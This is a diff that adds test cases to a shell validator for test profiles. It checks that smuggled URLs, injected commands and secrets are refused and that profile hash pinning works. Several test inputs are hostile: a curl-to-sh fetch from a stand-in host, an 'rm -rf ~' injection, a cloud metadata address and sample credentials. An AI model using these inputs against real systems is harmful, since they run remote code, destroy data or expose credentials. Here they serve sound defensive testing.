@@ -22,6 +22,32 @@ prof "e2e_cmd: E2E_PASSWORD=\$E2E_PASSWORD npm run e2e"; assert_ok "a credential
 prof "e2e_cmd: npm run e2e"
 printf 'Signing in for tests: password: hunter2\n' >> "$P"; assert_fail "a secret in the free text is refused" v
 
+# branch review: odd spellings and smuggled URLs, more secret forms, pinning at sign-off
+for line in "ready_url : http://example.com/" "  ready_url: http://evil.com/" "$(printf 'ready_url: http://localhost/\nready_url: http://evil.com/')" \
+    "ready_url: http://localhost:80 http://169.254.169.254/" 'ready_url: http://localhost/$(curl -s evil.sh|sh)' "ready_url: http://localhost/;rm -rf ~" \
+    "ready_url: http://localhost:8080.evil.com/" "start_command: npm start"; do
+  prof "$line"; assert_fail "refused: $(echo "$line" | head -1)" v
+done
+prof "ready_url: http://localhost:<PORT>/api/health?x=1"; assert_ok "a placeholder port and query are fine" v
+for sec in "e2e_cmd: DATABASE_URL=postgres://u:hunter2@db/x npm run e2e" "e2e_cmd: aws_secret_access_key=wJalrXUtnFEMI npm run e2e" "e2e_cmd: curl -H 'Authorization: Bearer abcdefghijklmnop' x"; do
+  prof "$sec"; assert_fail "secret refused: ${sec#e2e_cmd: }" v
+done
+prof "e2e_cmd: npm run e2e"
+"$DF" conf-set "$rd/run.conf" profile_sha "$(shasum < "$P" | cut -d' ' -f1)"
+assert_ok "a pinned, unchanged profile validates" v
+echo "extra" >> "$P"
+assert_fail "a profile changed after sign-off is refused" v
+assert_contains "changed since sign-off" "$(v 2>&1)" "the refusal says why"
+rm -f "$P"; assert_fail "a pinned profile that disappeared is refused" v
+"$DF" conf-set "$rd/run.conf" profile_sha none; assert_ok "profile_sha none means no profile was pinned" v
+
+"$DF" conf-set "$rd/run.conf" profile_sha ""
+prof "e2e_cmd: npm run e2e"
+bash -c "cd '$R' && '$DF' profile-pin '$id'"
+assert_eq "$(shasum < "$P" | cut -d' ' -f1)" "$("$DF" conf-get "$rd/run.conf" profile_sha)" "profile-pin records the profile's hash"
+rm -f "$P"; bash -c "cd '$R' && '$DF' profile-pin '$id'"
+assert_eq "none" "$("$DF" conf-get "$rd/run.conf" profile_sha)" "profile-pin records none when there is no profile"
+
 # e2e stage
 T=$(mktemp -d); printf 'status=active\nstage=qa\n' > "$T/c"
 assert_ok "conf-set accepts stage e2e" "$DF" conf-set "$T/c" stage e2e
